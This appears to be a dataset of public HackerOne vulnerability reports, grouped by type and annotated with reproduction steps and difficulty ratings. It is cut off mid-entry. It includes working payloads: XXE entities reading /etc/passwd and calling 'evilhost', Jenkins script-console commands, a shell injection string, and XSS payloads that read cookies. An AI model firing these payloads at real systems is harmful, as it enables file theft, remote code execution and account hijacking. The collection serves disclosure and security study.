POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1
Host: marketplace.informatica.com
Connection: keep-alive
Content-Length: 350
Accept: */*
X-J-Token: no-user
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Origin: https://marketplace.informatica.com
Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4
Content-Type: application/xml;charset=UTF-8
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [
<!ENTITY % b SYSTEM "file:///etc/passwd">
<!ENTITY % asd SYSTEM "http://evilhost/xx.html"> %asd; %rrr;]>
<params>
<offset>0</offset>
<queryParams>
<query>&xxe;</query>
<sortBy>relevance</sortBy>
<fieldList>["id", "title"]</fieldList>
</queryParams>
<source>marketplace</source>
<rows>5</rows>
</params>
And I got it :)



================================================================================
Vulnerability Description:
The vulnerability is an XML External Entity (XXE) injection in the marketplace.informatica.com API endpoint. By changing the Content-Type to XML and crafting a malicious XML payload with external entity references, an attacker can read arbitrary files from the server filesystem.

Steps to Reproduce:
1. Change the Content-Type header from application/json to application/xml in the request to the target endpoint.
2. Craft an XML payload with an external entity reference pointing to a sensitive file (e.g., /etc/passwd) and send it to the endpoint.
Exploitation Difficulty:
The attack requires understanding of XML parsing behavior and how to craft XXE payloads, but the components involved (Content-Type switching and basic XXE) are well-known and straightforward. The main complexity comes from needing to switch the request format from JSON to XML, which is a common technique for testing XXE vulnerabilities.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/106802: [marketplace.informatica.com] - XXE
================================================================================
RAW DESCRIPTION:

Request:
POST /__services/v2/rest/wall/new/count HTTP/1.1
Host: marketplace.informatica.com
Connection: keep-alive
Content-Length: 249
Accept: application/json, text/javascript, */*
X-J-Token: no-user
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Origin: https://marketplace.informatica.com
Referer: https://marketplace.informatica.com/profile-status-list.jspa?view=wallentry&username=jan-hendrik.huehne@bearingpoint.com
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4
Cookie: jive.server.info="serverName=marketplace.informatica.com:serverPort=443:contextPath=:localName=localhost.localdomain:localPort=9001:localAddr=127.0.0.1"; BIGipServermarketplace-new-int-Pool=958464266.20480.0000; __cdrop=.9IJG7.; __csess=1450347852471.CBUFVZ.; c08ea716-2192-4af0-b0be-eb4589f8bd3c=%7B%22parent_id%22%3A%22%22%2C%22id%22%3A%22kKfiDh-GHos%22%2C%22wom%22%3Afalse%2C%22fb_source%22%3A%22%22%2C%22url_tag%22%3A%22NOMTAG%22%7D; do_mkto_call=true; LastMRH_Session=d922d108; LiveBall=uid=9700856&uky=8BZWQCQN&rid=10286008; MRHSession=4c2087c52f486b2d8fe80461d922d108; s_dmdbase=rsp%3Dmatch%26cData%3D25961098%253ACjsc%2520Mastel%253AAutomotive%253AServices%253A1%2520to%252049%253A0-49%2520milli%253ASMB%253AAutomotive%26cDataCustom%3D%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253AMoscow%253Anull%253ARU%253A7514%26cDataCustom2%3Dnull%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%253A%255Bn%2Fa%255D%26sentAA%3DT; timeEnd_cookie=1450346443718; wm-ueug=%22yarbabin@gmail.com%22; wm-ag-d={%22st%22:1450435346802%2C%22sc%22:1%2C%22v%22:0%2C%22et%22:1450359167387%2C%22u%22:0}; s_sess=%20s_visitid%3D1450189337951%3B%20v16%3D%3B%20v32%3D%3B%20s_ppvl%3Dwww%25253Aus%25253Aen%25253Aproducts%25253Adata-integration%25253Areal-time-integration%25253Arulepoint-complex-event-processing%252C58%252C58%252C1019%252C1858%252C1019%252C1920%252C1080%252C1%252CP%3B%20s_ppv%3Dwww%25253Aus%25253Aen%25253Aproducts%25253Adata-integration%25253Areal-time-integration%25253Arulepoint-complex-event-processing%252C96%252C46%252C2119%252C1858%252C1019%252C1920%252C1080%252C1%252CP%3B; AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16794%7CMCMID%7C91737586653844139563863898912439590649%7CMCAID%7CNONE%7CMCAAMLH-1451408130%7C6%7CMCAAMB-1451571056%7Chmk_Lq6TPIBMW925SPhw3Q; JSESSIONID=67E6B255C5D2DAFF90610E94CB8B7D2A.; _ga=GA1.2.1092629952.1450189330; mkt_cookie=known; mbox=PC#1450189325935-186730.26_07#1452186131|check#true#1450976591|session#1450976530070-819656#1450978391; s_vnum=1452773966363%26vn%3D12; s_ppv=-%2C100%2C63%2C1319; __utmt=1; jive.recentHistory.-1=332c3136363137383b31342c323334353b31342c323334373b312c3130343130323b; s_cc=true; gpv_p8=Search; s_nr=1450984732287-Repeat; s_invisit=true; s_sq=informaticamarketplace%252Cinformaticamarketplace2%252Cinformaticacommunity%3D%2526pid%253Dinformatica%252520marketplace%252520community%2526pidt%253D1%2526oid%253Djavascript%25253A%25253B%2526ot%253DA; __utma=151370917.193365317.1450183778.1450970821.1450981714.11; __utmb=151370917.11.10.1450981714; __utmc=151370917; __utmz=151370917.1450981714.11.10.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1450183777729-16344
Content-Type: application/xml;charset=UTF-8
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd1" >]>
<count>
<tabName>profile</tabName>
<widgetID>&xxe;</widgetID>
<filterType>Only</filterType>
</count>
Response:
JAXBException occurred : /etc/passwd1 (No such file or directory). /etc/passwd1 (No such file or directory).



================================================================================
Vulnerability Description:
This is an XML External Entity (XXE) vulnerability in the Informatica Marketplace. The application processes XML input from user-controlled sources without proper validation or disabling of external entity references, allowing attackers to read arbitrary files on the server.

Steps to Reproduce:
1. Send a POST request to `/__services/v2/rest/wall/new/count` on `marketplace.informatica.com` with a crafted XML payload containing an XXE entity.
2. Observe the server's response, which may include sensitive file contents (e.g., `/etc/passwd`) if the XXE attack is successful.
Exploitation Difficulty:
The vulnerability is straightforward to exploit once the tester identifies an endpoint that accepts XML input. The attack involves a single component (XML parsing) and follows a well-known XXE exploitation pattern without requiring complex interactions or state manipulation.

--------------------------------------------------------------------------------



Code Injection Vulnerabilities (3 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1104349: Server Side Template Injection on Name parameter during Sign Up process
================================================================================
RAW DESCRIPTION:

Summary:
Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
In this scenario, when an attacker signs up on the platform and uses a payload in the First Name field, the payload is rendered server side and it gets executed in the promotional/welcome emails sent to the user
Steps To Reproduce:
Step 1: Navigate to [Glovoapp] (https://www.glovoapp.com/kg/en/bishkek/) and click on Register
Step 2: Now, in the First Name field, enter the value {{7*7}}
<image_0>
Step 3: Fill in the rest of the values on the Register page and register your account.
<image_1>
Step 4: We have used the payload {{7*7}} here to verify that it is being evaluated at the backend
Step 5: Now, wait for the welcome/promotional email to arrive in your Inbox
Step 6: Notice that the email arrives with the Subject as 49, welcome to Glovo!
<image_2>
Step 7: The attacker can now further exploit this issue by injecting malicious payloads in the Name field and gathering sensitive information from the application.
Note- After carrying out this attack, I didn't receive any welcome email for my other account maybe because the code broke.
Impact
Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, which can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.



================================================================================
Vulnerability Description:
Server-side template injection vulnerability in the First Name field during the sign-up process, allowing execution of malicious payloads in promotional/welcome emails.

Steps to Reproduce:
1. Navigate to the Glovo registration page and click on Register.
2. Enter the payload {{7*7}} in the First Name field and complete the registration process.
3. Wait for the welcome/promotional email to arrive and observe the evaluated payload in the email subject.
4. Confirm the vulnerability by testing with other malicious payloads to gather sensitive information.
Exploitation Difficulty:
The attack involves a straightforward injection of a template payload into a user input field, which is a common and well-documented vulnerability pattern. The interaction between the input field and the email template is direct and does not require complex state manipulation or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/768266: Public instance of Jenkins on https://██████████/ with /script enabled
================================================================================
RAW DESCRIPTION:

Summary:
An Amazon instance was found on https://█████/ running Jenkins. On analysing the SSL certificate, I reported here to the DoD.
Description:
On checking the SSL certificate, the details show:
Code 100 Bytes
1Issued to and Issued By records:
2
3CN: █████
4Organization(O): █████████
5Organizational Unit (OU): ███
Here, this instance is already authenticated and this does not require a password to login. The major impact of this vulnerability is, an attacker can exploit and gain access to critical internals of the server as /script is enabled.
Through /script, an attacker can run remote commands on the server through the Java programming language.
Impact
Unauthenticated instances of Jenkins with /script enabled can lead to an attacker running remote command on the instance.
Step-by-step Reproduction Instructions
Go to https://███/script/
1.1 Check the SSL certificate for proof.
In the textbox that comes up, enter the following code:
Code 21 Bytes
1"ls /".execute().text
The Response is
Code 92 Bytes
1Result: bin
2boot
3dev
4etc
5home
6lib
7lib64
8media
9mnt
10opt
11proc
12root
13run
14sbin
15srv
16sys
17tmp
18usr
19var
After verifying this issue, I looked up ██████████ and █████. That's how I confirmed that this instance was of critical importance.
Product, Version, and Configuration (If applicable)
Jenkins
Suggested Mitigation/Remediation Actions:
Mitigation for this, as per my understanding would be to add a 2FA authentication if this instance is in use. If this instance is not in use, please shut down the instance.
P.S: I've also attached a PoC video of the same for clarity and reference. I am reporting this issue to the US DOD as ██████████ would be more logical to be associated with the DOD. If this bug is not acknowledged here, please forward this report to the authority that handles the US ███████.
Impact
On a Jenkins instance with /script enabled, an attacker can remote commands on the server and this can later lead to critical information leakage, lateral movement and other catastrophic events as the instance can be manipulated by the skills of the attacker.
Such instances should be closed when not in use and authentication mechanisms should be properly enforced.



================================================================================
Vulnerability Description:
An unauthenticated Jenkins instance with /script enabled allows attackers to execute arbitrary commands on the server, potentially leading to critical information leakage and server compromise.

Steps to Reproduce:
1. Go to https://███/script/ and check the SSL certificate for proof.
2. In the textbox that appears, enter the following code: "ls /".execute().text to list the root directory contents.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a single, well-known feature (/script) in Jenkins that is publicly accessible without authentication. The attack does not require complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/973245: [imagickal] Remote Code Execution
================================================================================
RAW DESCRIPTION:

I would like to report RCE in imagickal
It allows to execute arbitrary commands on the victim's PC
Module
module name: imagickal
version: 4.2.0
npm page: https://www.npmjs.com/package/imagickal
Module Description
node wrapper for ImageMagick commands
Module Stats
[42] weekly downloads
Vulnerability
Vulnerability Description
Code injection while processing a photo
Steps To Reproduce:
Run npm i imagickal
Create and run the following POC index.js:
Code 118 Bytes
1var im = require('imagickal');
2
3im.identify('image.jpg;touch HACKED;').then(function (data) {
4  console.log(data);
5});
The exploit worked and created the file - HACKED
Patch
Check input before command
Wrap up
I contacted the maintainer to let them know: [N]
I opened an issue in the related repository: [N]
Impact
Command Injection on imagickal module via insecure command



================================================================================
Vulnerability Description:
The imagickal module is vulnerable to command injection via insecure processing of user-supplied input in the identify function, allowing arbitrary command execution.

Steps to Reproduce:
1. Run npm i imagickal
2. Create and run the following POC index.js: var im = require('imagickal'); im.identify('image.jpg;touch HACKED;').then(function (data) { console.log(data); });
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common command injection pattern where user input is directly passed to a system command without proper sanitization. The attack does not require complex interactions or state manipulation.

--------------------------------------------------------------------------------



OS Command Injection Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1125329: Unauth RCE on Jenkins Instance at https://█████████/
================================================================================
RAW DESCRIPTION:

Description:
Hi Team,
While Doing Recon on U.s Government Sites, I Found below asset Belongs to U.S Government (Please Check its SSL certificate to confirm or Please check attached POC Video)
█████████
https://███/
Attacker can execute Command Injection without Authentication.
Impact
Unauth RCE
System Host(s)
███
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Navigate to https://███████/_script
Please execute below commands to confirm Unauth RCE.
Commands: println "ls".execute().text
println "whoami".execute().text
#POC
Please check Attached POC Video to follow steps (If Required)
██████
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
Unauthenticated Remote Code Execution (RCE) vulnerability in a Jenkins instance, allowing attackers to execute arbitrary commands without authentication.

Steps to Reproduce:
1. Navigate to the vulnerable Jenkins instance at https://███████/_script
2. Execute the following commands to confirm RCE: println "ls".execute().text and println "whoami".execute().text
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of a script console endpoint in Jenkins that is accessible without authentication. The attack does not require multiple components, complex state manipulation, or novel logic. The steps to reproduce are simple and do not involve subtle interactions between components.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - Generic Vulnerabilities (12 reports)
--------------------------------------------------

Report https://hackerone.com/reports/143323: [uk.informatica.com] XSS on uk.informatica..com
================================================================================
RAW DESCRIPTION:

The following urls on uk.informatica.com:80 have XSS vulnerabilities, I have copied the POST header and data for both instances.

http://uk.informatica.com:80/o/Default.asp (parameters found vulnerable PageLink, ResponseHandlingLanguage, UID), The below example shows the PageLink parameter being exploited with
" style="width:expression(prompt(1));
POST /o/Default.asp HTTP/1.1
Content-Length: 779
Content-Type: application/x-www-form-urlencoded
Referer: http://uk.informatica.com:80/
Cookie: eu=; ASPSESSIONIDQCABSAAR=DMLJGLOADMFJNAEMPHCPLBMG; Lang=ResponseHandlingLanguage=British
Host: uk.informatica.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: /
OPTOUT=Submit&DMAILX=true&EMAIL=sample%40email.tst&EMAILX=true&EVENTS_DMAIL=TRUE&EVENTS_EMAIL=TRUE&EVENTS_PHONE=TRUE&NAME=&NEWSLETTERS_DMAIL=TRUE&NEWSLETTERS_EMAIL=TRUE&NEW_PRODUCT_DMAIL=TRUE&NEW_PRODUCT_EMAIL=TRUE&NEW_PRODUCT_PHONE=TRUE&OptOutForm=OptOutForm&PageLink=1" style="width:expression(prompt(1));&PHONEX=true&PRODUCT_UPDATE_DMAIL=TRUE&PRODUCT_UPDATE_EMAIL=TRUE&PRODUCT_UPDATE_PHONE=TRUE&PROMOTIONS_DMAIL=TRUE&PROMOTIONS_EMAIL=TRUE&PROMOTIONS_PHONE=TRUE&ResponseHandlingLanguage=British&SURNAME=&TITLE=&TRAINING_DMAIL=TRUE&TRAINING_EMAIL=TRUE&TRAINING_PHONE=TRUE&UID=&USERGROUPS_DMAIL=TRUE&USERGROUPS_EMAIL=TRUE&USERGROUPS_PHONE=TRUE&WEBINAR_DMAIL=TRUE&WEBINAR_EMAIL=TRUE&WEBINAR_PHONE=TRUE&WHITEPAPERS_DMAIL=TRUE&WHITEPAPERS_EMAIL=TRUE&WHITEPAPERS_PHONE=TRUE

http://uk.informatica.com:80/r/Default.asp (parameters found vulnerable PageLink, ResponseHandlingLanguage, UID), The below example shows the UID parameter being exploited with "><script>prompt(1)</script> .
POST /r/Default.asp HTTP/1.1
Content-Length: 779
Content-Type: application/x-www-form-urlencoded
Referer: http://uk.informatica.com:80/
Cookie: eu=; ASPSESSIONIDQCABSAAR=DMLJGLOADMFJNAEMPHCPLBMG; Lang=ResponseHandlingLanguage=British
Host: uk.informatica.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: /
OPTOUT=Submit&DMAILX=true&EMAIL=sample%40email.tst&EMAILX=true&EVENTS_DMAIL=TRUE&EVENTS_EMAIL=TRUE&EVENTS_PHONE=TRUE&NAME=&NEWSLETTERS_DMAIL=TRUE&NEWSLETTERS_EMAIL=TRUE&NEW_PRODUCT_DMAIL=TRUE&NEW_PRODUCT_EMAIL=TRUE&NEW_PRODUCT_PHONE=TRUE&OptOutForm=OptOutForm&PageLink=1&PHONEX=true&PRODUCT_UPDATE_DMAIL=TRUE&PRODUCT_UPDATE_EMAIL=TRUE&PRODUCT_UPDATE_PHONE=TRUE&PROMOTIONS_DMAIL=TRUE&PROMOTIONS_EMAIL=TRUE&PROMOTIONS_PHONE=TRUE&ResponseHandlingLanguage=British&SURNAME=&TITLE=&TRAINING_DMAIL=TRUE&TRAINING_EMAIL=TRUE&TRAINING_PHONE=TRUE&UID="><script>prompt(1)</script>&USERGROUPS_DMAIL=TRUE&USERGROUPS_EMAIL=TRUE&USERGROUPS_PHONE=TRUE&WEBINAR_DMAIL=TRUE&WEBINAR_EMAIL=TRUE&WEBINAR_PHONE=TRUE&WHITEPAPERS_DMAIL=TRUE&WHITEPAPERS_EMAIL=TRUE&WHITEPAPERS_PHONE=TRUE



================================================================================
Vulnerability Description:
The vulnerability involves reflected Cross-Site Scripting (XSS) on uk.informatica.com, where user-supplied input in parameters (PageLink, ResponseHandlingLanguage, UID) is not properly sanitized before being reflected in the response. This allows attackers to execute arbitrary JavaScript code in the context of the victim's browser session.

Steps to Reproduce:
1. Navigate to http://uk.informatica.com:80/o/Default.asp or http://uk.informatica.com:80/r/Default.asp
2. Inject the XSS payload into the vulnerable parameters (PageLink, ResponseHandlingLanguage, UID) as shown in the report
Exploitation Difficulty:
The attack is straightforward with no complex interactions between components or application states. The vulnerability is discovered by simple input manipulation in URL parameters, a common testing technique for XSS.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/179164: Stored XSS in community.ubnt.com
================================================================================
RAW DESCRIPTION:

I have created two accounts
one attacker account: vibhuti123_i
other victim account: John_victim
attacker account:vibhuti123_i who will create a malicious link after uploading svg file embeded with script and doing stored xss.Now attacker vibhuti123_i will send this stored xss malicious link to victim:john_victim by posts,message,reply of ubnt community features or anyother way of communication.After this John_victim will believe this link as it is saved on community.ubnt.com server.It's no way look dangerous so john_victim will click this link and xss gets executed.
This stored xss link created by attacker will execute in every account and also it is accessible without login.
http://community.ubnt.com/t5/image/serverpage/image-id/0iA7662344C5BC7B7E/image-size/thumb/is-preview/true?v=v2&px=100
Please go through Video POC:--
https://youtu.be/Z0UCmv-Tpqs
PLease read the Document of OWASP.org about svg xss below:
https://www.owasp.org/images/0/03/Mario_Heiderich_OWASP_Sweden_The_image_that_called_me.pdf



================================================================================
Vulnerability Description:
This vulnerability is a stored XSS in community.ubnt.com where an attacker can upload an SVG file containing a malicious script. The script is then executed when a victim clicks a link to the uploaded file, which is hosted on the community server. The attack is persistent and can affect multiple users, including those who are not logged in.

Steps to Reproduce:
1. Create two accounts on community.ubnt.com: one attacker account (vibhuti123_i) and one victim account (John_victim).
2. Using the attacker account, upload an SVG file embedded with a malicious script to perform stored XSS.
3. Generate a malicious link from the uploaded SVG file and send it to the victim account via posts, messages, replies, or other communication methods within the community.
4. The victim clicks the link, believing it to be safe since it is hosted on community.ubnt.com, and the XSS payload executes.
Exploitation Difficulty:
The attack involves uploading a malicious SVG file and crafting a link to it, which is a known technique for stored XSS. The interaction between the SVG file and the community platform is straightforward, and the attack does not require complex application state manipulation or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1887917: XSS from Mastodon embeds
================================================================================
RAW DESCRIPTION:

By default, the IRCCloud web client embeds Mastodon toots when a link to one is sent. Anyone can run a Mastodon server, and so the server from which toot data is fetched might be malicious. It is possible for an attacker to cause a web client user to execute arbitrary JavaScript in the context of the IRCCloud web client by tricking the web client into embedding a javascript: URL.
POC:
Ensure "Embed social media links" is enabled in settings under "Chat & embeds" (I think this is on by default)
Send a message with a link to https://sm4.ca/@a/123456789012345678 (the link itself 404s but IRCCloud only tries to use Mastodon API so it doesn't matter)
Wait a few seconds for the embed to load
Look at your session cookie
When the web client sees what looks like a toot URL, it tries to get canonical toot URL by making a query to [domain]/api/v1/statuses/[toot ID]. Here is what I serve at https://sm4.ca/api/v1/statuses/123456789012345678:
Code 150 Bytes
1{
2  "account": {
3    "url": "https://sm4.ca/@a"
4  },
5  "url": "javascript:top.document.body.innerHTML = \"hi your cookie is \" + document.cookie;//"
6}
(.account.url is only present because the web client ensures it matches the original link)
The web client creates an iframe using .url as the src, which in this case is a javascript: URL. The specified script runs in a seperate document that has access to its parent, and can access anything the parent can. The // is needed at the end since the web client appends /embed to the embed URL.
(also apart from this particular issue, I don't think Mastodon embeds should be enabled unless "Embed 3rd party image and video links" is enabled since even when the Mastodon server isn't malicious your IP address is still leaked to an arbitrary server)
Impact
An attacker who can send a message to an web-client-using IRCCloud user can obtain their session token and act as them. By sending a message with a malicious URL to a large channel an attacker could compromise many users at once.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to execute arbitrary JavaScript in the context of the IRCCloud web client by tricking it into embedding a malicious Mastodon toot with a javascript: URL. This can lead to session token theft and account compromise.

Steps to Reproduce:
1. Ensure 'Embed social media links' is enabled in settings under 'Chat & embeds'
2. Send a message with a link to https://sm4.ca/@a/123456789012345678
3. Wait a few seconds for the embed to load
4. Look at your session cookie
Exploitation Difficulty:
The attack involves understanding Mastodon API interactions, iframe embedding behavior, and JavaScript URL execution. While the components are standard web technologies, the combination of exploiting Mastodon embeds with JavaScript URLs is non-obvious and requires specific knowledge of how IRCCloud processes these embeds.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/190217: [marketplace.informatica.com] Profile stored XSS
================================================================================
RAW DESCRIPTION:

The user name and lastname are inserted into JS with quotes non-escaped:
Code 89 Bytes
1var pageNameDTM = "%name% %lastname%".replace(/[^a-zA-Z0-9 ]/g, "").replace(/  +/g, " ");
PoC:
Log into your account
Set your name and lastname to "-alert(document.domain)-"
Open your profile page https://marketplace.informatica.com/people/%email% from another account
The script will be executed:
<image_0>



================================================================================
Vulnerability Description:
The user name and lastname are inserted into JavaScript without proper escaping, allowing for stored XSS when another user views the profile page.

Steps to Reproduce:
1. Log into your account and set your name and lastname to "-alert(document.domain)-".
2. Open your profile page from another account at https://marketplace.informatica.com/people/%email% to execute the script.
Exploitation Difficulty:
The vulnerability involves a straightforward XSS injection through user profile fields, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/203912: Stored XSS via Discussion Title and Send as Email attribute in [marketplace.informatica.com]
================================================================================
RAW DESCRIPTION:

POC
Under "Your Stuff" choose to "Create a Discussion/Ask a question"
Choose a space to submit your discussion/question. Any space will do.
Title your discussion with the payload "><img src=x onerror=alert(1)>
Choose "Post message" to publish.
View the message as any user. Under "Actions" choose to "Send as Email"
Observe XSS poc alert box"
Please let me know if you have any questions.



================================================================================
Vulnerability Description:
This vulnerability is a Stored Cross-Site Scripting (XSS) issue in the discussion title and 'Send as Email' feature of marketplace.informatica.com. An attacker can inject malicious JavaScript code into the discussion title, which is then executed when another user views the discussion and chooses to send it as an email.

Steps to Reproduce:
1. Under 'Your Stuff', choose 'Create a Discussion/Ask a question'
2. Choose a space to submit your discussion/question. Any space will do.
3. Title your discussion with the payload: '><img src=x onerror=alert(1)>'
4. Choose 'Post message' to publish.
5. View the message as any user. Under 'Actions', choose 'Send as Email'
6. Observe XSS poc alert box
Exploitation Difficulty:
The vulnerability involves a straightforward injection of a common XSS payload into a user-input field (discussion title), which is then rendered unsanitized in another context (email). The steps are linear and do not require complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/219509: Store XSS on Informatica University via transcript (informatica.csod.com)
================================================================================
RAW DESCRIPTION:

Hi,
Vulnerable field: Training Description
Steps to reproduce:
Login to your account and go Informatica University.
You can either click on "My Training" or "Universal Profile" at the upper right hand corner of the page.
You will then be redirected to the Universal profile bio page, click on the "Transcript tab"
Select options on the upper right side then select "Add external training: on the drop down option.
Fill out the needed information but for the Training Description use the following payload: '"><img src=x onerror=alert(document.cookie);>
Complete the rest of the form and click on Submit.
You will then be redirected to your training transcript.
On the right side of the transcript which has a label withdraw, select from the drop down "View training details"
The page will be redirected and you will then get the xss pop-up.
Would be best to sanitize all input on this form to avoid xss.
Works on latest versions of chrome, and firefox.
Please let me know if you need further information. Thanks!
Cheers,
@ninjakatz__



================================================================================
Vulnerability Description:
This is a stored Cross-Site Scripting (XSS) vulnerability in Informatica University's training transcript feature. The vulnerability allows an attacker to inject malicious JavaScript code via the Training Description field in the 'Add external training' form. The injected code is then executed when the training details are viewed, potentially leading to session hijacking or other malicious actions.

Steps to Reproduce:
1. Login to your account and navigate to Informatica University.
2. Go to 'My Training' or 'Universal Profile' at the upper right corner of the page.
3. Click on the 'Transcript' tab in the Universal profile bio page.
4. Select 'Add external training' from the options drop-down on the upper right side.
5. Fill out the form, using the payload '"><img src=x onerror=alert(document.cookie);> in the Training Description field.
6. Submit the form and return to your training transcript.
7. Select 'View training details' from the drop-down next to the training entry.
8. Observe the XSS pop-up when the page redirects.
Exploitation Difficulty:
The vulnerability involves a straightforward injection into a form field, with the payload being executed upon viewing the stored data. There are no complex interactions between components or novel logic required to exploit this vulnerability. The steps to reproduce are linear and do not require deep understanding of the application's architecture or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2611305:  Potential XSS Vulnerability in Acronis Login Callback URL
================================================================================
RAW DESCRIPTION:

Summary
The login callback URL, https://learn.acronis.com/portal/, is vulnerable to Cross-Site Scripting (XSS) attacks. When a user logs in and is redirected to this URL, the redirectUrl parameter is not properly sanitized, allowing an attacker to inject arbitrary JavaScript code. This code could be used to steal the user's session cookie, perform phishing attacks, or deface the website.
Steps To Reproduce
I was able to exploit this vulnerability by crafting a URL that included malicious JavaScript code in the redirectUrl parameter. When a user clicks on this URL and logs in, the injected code is executed in the user's browser.
For example, the following URL would display an alert containing the website domain: https://learn.acronis.com/portal/login-callback?redirectUrl=javascript:alert(document.domain)
An attacker could replace the alert with malicious code that steals the user's session cookie or redirects the user to a phishing website.
<image_0>
Impact
This vulnerability could allow an attacker to:
Steal user session cookies
Perform phishing attacks
Deface the website
Take control of user accounts



================================================================================
Vulnerability Description:
The login callback URL is vulnerable to Cross-Site Scripting (XSS) attacks due to improper sanitization of the redirectUrl parameter, allowing arbitrary JavaScript execution in the victim's browser upon login.

Steps to Reproduce:
1. Craft a URL with a malicious JavaScript payload in the redirectUrl parameter, e.g., https://learn.acronis.com/portal/login-callback?redirectUrl=javascript:alert(document.domain)
2. Have a victim click the crafted URL and log in to trigger the XSS payload
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS vector (URL parameter injection) with no complex interactions or state manipulation required. The attack follows a predictable pattern of URL crafting and victim interaction.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/324548: Html injection mycrypto.com
================================================================================
RAW DESCRIPTION:

Hello. I remembered that a couple of months ago I found an HTML injection vulnerability on myetherwallet.com, I sent it, but my message was ignored.
Since you have the same interface, I decided to check this vulnerability on your site and it was reproduced. The vulnerability works both on www.mycrypto.com and on mycrypto.com.
Html injection is in a pop-up message
 <div class = "alert-message ng-binding" ng-bind-html = "alert.message"> You are successfully connected
<br> URL: <strong> https://www.mycrypto.com/?txHash=qwqwq%3C%20SRC=%22jav
ascript: alert (0); "& gt; <a href="https://securityz.net"> <img src =" https://securityz.net/mycrypto.jpeg "> </a> qwqw # check- tx-status </ strong> <br> Network: <strong> ETH </ strong> provided by <strong> mycryptoapi.com </ strong> </ div>
Unfortunately, you have filtering there, I could not execute js and could hardly display a picture with href on the page.
## PoC
https://mycrypto.com/?txHash=qwqwq%3C%20SRC=%22jav ascript:alert(0);"> <a href="https://securityz.net"><img src="https://securityz.net/mycrypto.jpeg"></a>qwqw#check-tx-status
PoC video
https://www.youtube.com/watch?v=JmP9AU8sX5k .
##Impact
Since your site and myetherwallet are often subjected to phishing attacks, this vulnerability is dangerous. You can put in the href url of the phishing site, then you can steal the private key of the victim. Perhaps you can upload js to the site, but I could not do it.
Impact
Since your site and myetherwallet are often subjected to phishing attacks, this vulnerability is dangerous. You can put in the href url of the phishing site, then you can steal the private key of the victim. Perhaps you can upload js to the site, but I could not do it.



================================================================================
Vulnerability Description:
The vulnerability is an HTML injection in a pop-up message on mycrypto.com, which allows an attacker to inject arbitrary HTML content, including links and images. While JavaScript execution is filtered, the injection could potentially be used for phishing attacks by embedding malicious links.

Steps to Reproduce:
1. Navigate to the URL: https://mycrypto.com/?txHash=qwqwq%3C%20SRC=%22jav ascript:alert(0);"> <a href="https://securityz.net"><img src="https://securityz.net/mycrypto.jpeg"></a>qwqw#check-tx-status
2. Observe the HTML injection in the pop-up message where the injected content (image with href) is displayed
Exploitation Difficulty:
The attack is straightforward, involving only the injection of HTML content into a URL parameter. It does not require complex interactions between components or manipulation of application states. The vulnerability is a basic HTML injection, which is a common and well-known issue.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/341044: [cloudcmd] Stored XSS in the filename when directories listing
================================================================================
RAW DESCRIPTION:

I would like to report a Stored XSS issue in module cloudcmd
It allows executing malicious javascript code in the user's browser.
Module
module name: cloudcmd
version: 9.1.5
npm page: https://www.npmjs.com/package/cloudcmd
Module Description
Cloud Commander is an orthodox web file manager with console and editor.
Module Stats
